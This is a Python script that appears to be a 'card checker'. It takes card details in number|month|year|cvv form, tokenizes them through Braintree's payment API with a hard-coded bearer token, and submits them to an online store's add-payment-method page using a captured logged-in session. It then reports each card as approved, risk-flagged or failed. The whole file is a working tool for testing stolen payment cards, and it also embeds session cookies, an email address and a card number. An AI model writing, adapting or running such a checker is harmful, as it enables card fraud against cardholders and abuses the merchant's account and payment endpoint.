import requests, re, base64, random, string, user_agent, time
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	

	



	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTk1ODIzODYsImp0aSI6ImVlMmI3ZjNmLTVmNmUtNGE0ZS1iNjM5LTRkYjhhZjdkMGU4YSIsInN1YiI6ImhubWM4OW5oY2JmbWo3OWsiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImhubWM4OW5oY2JmbWo3OWsiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.FQOINjkiUzfX3ShlFUh0oEdvx8WY4cYN0rAdBGvl9I64hFbJZKubioVtH9M09er4v3om6IFcVnRz7_oHU0Y4IA',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': 'b47484b5-5b5e-4923-be3f-2d0ea865e5a9',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"b47484b5-5b5e-4923-be3f-2d0ea865e5a9"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4347697102867592","expirationMonth":"03","expirationYear":"2028","cvv":"542"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)



	tok = response.json()['data']['tokenizeCreditCard']['token']








	cookies = {
    '_gcl_au': '1.1.1472496388.1719495670',
    '_ga': 'GA1.1.123030639.1719495671',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-06-27%2013%3A41%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Fpopshopamerica.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
    'sbjs_first_add': 'fd%3D2024-06-27%2013%3A41%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Fpopshopamerica.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '_fbp': 'fb.1.1719495673452.658632375669694002',
    '_pin_unauth': 'dWlkPU9USXlaRFJtWkdNdE1EazRaUzAwWVdSaUxXSTJZVE10WXpjMU16TXhNV1E0TW1aaQ',
    '__attentive_id': 'ff01fadc7c4e4018a1c5399771116ec6',
    '__attentive_cco': '1719495683800',
    '_attn_': 'eyJ1Ijoie1wiY29cIjoxNzE5NDk1NjgzODUyLFwidW9cIjoxNzE5NDk1NjgzODUyLFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcImZmMDFmYWRjN2M0ZTQwMThhMWM1Mzk5NzcxMTE2ZWM2XCJ9In0=',
    '__attentive_dv': '1',
    '__attentive_ss_referrer': 'https://www.google.com/',
    'attntv_mstore_email': 'lyy446333@gmail.com:0',
    'wordpress_logged_in_57b1d378b93f8ee3b582f52122aa4081': 'lyy446333%7C1720705402%7Cp7pSrRJUIvuK7JGhd6xQWGS40dcpcoacVI9GxlgxYAB%7C3fa00d033cb73baf3877f6aa8d0ac9e685e2e483a659be28a73f08b1816b4027',
    'mcfw-wp-user-cookie': 'OTIxMDU1M3wwfDYzfDM5ODAzXzIyMTYxMDM4Mjk0YmNiY2EyOTA5YzFmOTQ3OGM1MTE3ODRjOGQxMzk0MjY2Yjk1MmI3MDJmYzM3YWYxYWMxMzY%3D',
    'wfwaf-authcookie-8e70f1282ca3ef14f13a063725cc6fe0': '9210553%7Cother%7Cread%7C1adeff570d0316685f96f67ada50539bfaf69ae7fdafcbfaa4a30e6c77c506c5',
    'sbjs_session': 'pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpopshopamerica.com%2Fmy-account%2Fadd-payment-method%2F',
    '__attentive_pv': '13',
    '_ga_H8NGEHCB64': 'GS1.1.1719495670.1.1.1719496041.1.0.0',
}

	headers = {
    'authority': 'popshopamerica.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_gcl_au=1.1.1472496388.1719495670; _ga=GA1.1.123030639.1719495671; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-06-27%2013%3A41%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Fpopshopamerica.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2024-06-27%2013%3A41%3A11%7C%7C%7Cep%3Dhttps%3A%2F%2Fpopshopamerica.com%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _fbp=fb.1.1719495673452.658632375669694002; _pin_unauth=dWlkPU9USXlaRFJtWkdNdE1EazRaUzAwWVdSaUxXSTJZVE10WXpjMU16TXhNV1E0TW1aaQ; __attentive_id=ff01fadc7c4e4018a1c5399771116ec6; __attentive_cco=1719495683800; _attn_=eyJ1Ijoie1wiY29cIjoxNzE5NDk1NjgzODUyLFwidW9cIjoxNzE5NDk1NjgzODUyLFwibWFcIjoyMTkwMCxcImluXCI6ZmFsc2UsXCJ2YWxcIjpcImZmMDFmYWRjN2M0ZTQwMThhMWM1Mzk5NzcxMTE2ZWM2XCJ9In0=; __attentive_dv=1; __attentive_ss_referrer=https://www.google.com/; attntv_mstore_email=lyy446333@gmail.com:0; wordpress_logged_in_57b1d378b93f8ee3b582f52122aa4081=lyy446333%7C1720705402%7Cp7pSrRJUIvuK7JGhd6xQWGS40dcpcoacVI9GxlgxYAB%7C3fa00d033cb73baf3877f6aa8d0ac9e685e2e483a659be28a73f08b1816b4027; mcfw-wp-user-cookie=OTIxMDU1M3wwfDYzfDM5ODAzXzIyMTYxMDM4Mjk0YmNiY2EyOTA5YzFmOTQ3OGM1MTE3ODRjOGQxMzk0MjY2Yjk1MmI3MDJmYzM3YWYxYWMxMzY%3D; wfwaf-authcookie-8e70f1282ca3ef14f13a063725cc6fe0=9210553%7Cother%7Cread%7C1adeff570d0316685f96f67ada50539bfaf69ae7fdafcbfaa4a30e6c77c506c5; sbjs_session=pgs%3D13%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpopshopamerica.com%2Fmy-account%2Fadd-payment-method%2F; __attentive_pv=13; _ga_H8NGEHCB64=GS1.1.1719495670.1.1.1719496041.1.0.0',
    'origin': 'https://popshopamerica.com',
    'pragma': 'no-cache',
    'referer': 'https://popshopamerica.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = [
    ('payment_method', 'braintree_credit_card'),
    ('wc-braintree-credit-card-card-type', 'visa'),
    ('wc-braintree-credit-card-3d-secure-enabled', ''),
    ('wc-braintree-credit-card-3d-secure-verified', ''),
    ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
    ('wc_braintree_credit_card_payment_nonce',tok,),
    ('wc_braintree_device_data', '{"correlation_id":"e17076e2a679090eee47665ada002a9e"}'),
    ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
    ('wc_braintree_paypal_payment_nonce', ''),
    ('wc_braintree_device_data', '{"correlation_id":"e17076e2a679090eee47665ada002a9e"}'),
    ('wc-braintree-paypal-context', 'shortcode'),
    ('wc_braintree_paypal_amount', '0.00'),
    ('wc_braintree_paypal_currency', 'USD'),
    ('wc_braintree_paypal_locale', 'en_us'),
    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
    ('woocommerce-add-payment-method-nonce', 'c6ef2df265'),
    ('_wp_http_referer', '/my-account/add-payment-method/'),
    ('woocommerce_add_payment_method', '1'),
]

	response = requests.post('https://popshopamerica.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
	
	text = response.text
	
	pattern = r'Status code (.*?)\s*</li>'
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result
	
